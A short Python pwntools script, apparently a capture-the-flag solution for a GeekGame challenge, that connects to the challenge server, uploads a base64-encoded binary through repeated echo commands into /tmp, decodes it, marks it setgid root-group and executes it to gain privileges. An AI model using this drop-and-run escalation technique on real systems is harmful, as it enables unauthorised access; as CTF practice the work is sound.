from pwn import *
import time

with open("output", "r") as f:
    x = ''.join(f.readlines())

r = remote("prob13.geekgame.pku.edu.cn", 10013)
print(r.recvuntil(b":").decode())
r.sendline(b"GgT-Y67HiKC-HQBvP2HZ_T2jwBwvDltljq7TNfDOfcQPnQw-gjex7OwSK6lwhUxc8TD7JAuJxZzr6Mgqfjl7Oz5PACQI")
print(r.recvuntil(b"Flag (1/2): ").decode())
r.sendline(b"1")
xs = x.split('\n')

r.sendline(b"cd /tmp")
print(r.recvuntil(b"$ ").decode())
for y in xs:
    if y == '':
        continue
    r.sendline(f"echo -n '{y}' >> x.b".encode('ascii'))
    r.sendline()
    time.sleep(0.05)
    print(r.recvuntil(b"$ ").decode())
    print(r.recvuntil(b"$ ").decode())

r.sendline(b"ls -l && cat x.b | base64 -d > x.o")
print(r.recvuntil(b"$ ").decode())
r.sendline(b"ls -l && chgrp 0 x.o && chmod g+s,+x x.o")
print(r.recvuntil(b"$ ").decode())
r.sendline(b"id && ./x.o")
print(r.recvuntil(b"$ ").decode())
r.sendline(b"id && help")
print(r.recvuntil(b"$ ").decode())